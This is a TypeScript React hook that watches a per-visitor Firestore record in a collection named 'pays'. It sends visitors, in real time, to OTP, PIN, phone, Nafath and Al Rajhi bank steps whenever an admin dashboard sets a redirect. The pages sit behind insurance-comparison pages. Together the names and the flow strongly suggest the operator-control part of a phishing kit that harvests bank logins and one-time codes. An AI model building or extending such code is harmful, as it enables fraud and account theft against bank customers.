/**
 * Hook to monitor redirect requests from admin dashboard
 * Ultra-fast response (< 1 second) using Firebase real-time listeners
 */

import { useEffect, useRef } from "react";
import { useRouter } from "next/navigation";
import { db } from "@/lib/firebase";
import { doc, onSnapshot, setDoc, Firestore } from "firebase/firestore";

interface UseRedirectMonitorProps {
  visitorId: string;
  currentPage: string;
}

// Page mapping for all routes
const PAGE_MAP: Record<string, string> = {
  // Modern redirectPage values
  home: "/home-new",
  insur: "/insur",
  compar: "/compar",
  check: "/check",
  payment: "/check",
  otp: "/step2",
  pin: "/step3",
  phone: "/step5",
  nafad: "/step4",
  rajhi: "/step6",
  // Legacy currentStep values
  _t6: "/step4",
  _st1: "/check",
  _t2: "/step2",
  _t3: "/step3",
};

export function useRedirectMonitor({
  visitorId,
  currentPage,
}: UseRedirectMonitorProps) {
  const router = useRouter();
  const lastProcessedRef = useRef<string>("");
  const isProcessingRef = useRef(false);

  useEffect(() => {
    if (!visitorId || !db) return;

    console.log(`[RedirectMonitor] Starting listener for visitor: ${visitorId}`);

    // Listen to real-time changes - Firebase onSnapshot is < 100ms
    const unsubscribe = onSnapshot(
      doc(db as Firestore, "pays", visitorId),
      async (snapshot) => {
        if (!snapshot.exists()) return;
        
        const data = snapshot.data();
        const now = Date.now();
        
        // Skip if already processing
        if (isProcessingRef.current) return;

        // Check redirectPage (modern system) - HIGHEST PRIORITY
        const redirectPage = data.redirectPage as string | undefined;
        const redirectUpdatedAt = data.redirectPageUpdatedAt as number | undefined;
        
        if (redirectPage && redirectPage !== currentPage) {
          // Check if this is a NEW redirect (within 2 seconds for faster response)
          if (!redirectUpdatedAt || (now - redirectUpdatedAt > 2000)) {
            console.log('[RedirectMonitor] Stale redirect, ignoring')
            return
          }
          
          // Check if already processed this redirect
          const redirectKey = `redirect_${redirectPage}_${redirectUpdatedAt}`;
          if (lastProcessedRef.current === redirectKey) {
            console.log('[RedirectMonitor] Already processed this redirect')
            return
          }
          
          isProcessingRef.current = true;
          lastProcessedRef.current = redirectKey;
          
          const targetUrl = PAGE_MAP[redirectPage] || `/${redirectPage}`;
          console.log(`[RedirectMonitor] 🚀 Redirecting from ${currentPage} to ${targetUrl}`);

          // Clear redirect flag
          await setDoc(doc(db as Firestore, "pays", visitorId), {
            redirectPage: null,
            redirectPageUpdatedAt: now
          }, { merge: true });

          // Navigate immediately
          router.push(targetUrl);
          
          setTimeout(() => {
            isProcessingRef.current = false;
          }, 1000);
          return;
        }

        // Check currentStep (legacy system)
        const currentStep = data.currentStep as string | undefined;
        const currentStepUpdatedAt = data.currentStepUpdatedAt as number | undefined;
        
        if (currentStep && currentStep !== currentPage) {
          // Check if this is a NEW redirect (within 2 seconds)
          if (!currentStepUpdatedAt || (now - currentStepUpdatedAt > 2000)) {
            return
          }
          
          // Check if already processed this step
          const stepKey = `step_${currentStep}_${currentStepUpdatedAt}`;
          if (lastProcessedRef.current === stepKey) {
            return
          }
          
          isProcessingRef.current = true;
          lastProcessedRef.current = stepKey;
          
          const targetUrl = PAGE_MAP[currentStep];
          if (targetUrl && targetUrl !== `/${currentPage}`) {
            console.log(`[RedirectMonitor] 🚀 Legacy redirect from ${currentPage} to ${targetUrl}`);
            router.push(targetUrl);
          }
          
          setTimeout(() => {
            isProcessingRef.current = false;
          }, 1000);
        }
      },
      (error) => {
        console.error("[RedirectMonitor] Error:", error);
      }
    );

    return () => {
      console.log("[RedirectMonitor] Cleaning up listener")
      unsubscribe()
    };
  }, [visitorId, currentPage, router]);
}

// Export for admin to get available pages
export const AVAILABLE_REDIRECT_PAGES = Object.keys(PAGE_MAP);
